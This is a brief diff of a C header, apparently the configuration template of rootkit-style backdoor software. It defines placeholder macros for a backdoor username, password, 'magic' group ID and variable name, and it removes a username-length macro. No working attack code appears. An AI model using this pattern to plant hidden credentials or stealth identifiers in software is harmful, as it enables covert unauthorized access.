@@ -4,7 +4,6 @@
 */
 
 #define BD_UNAME "??BD_UNAME??"
-#define BD_UNAME_LEN strlen(BD_UNAME)
 #define BD_PWD "??BD_PWD??"
 #define MAGIC_GID ??MAGIC_GID??
 #define BD_VAR "??BD_VAR??"
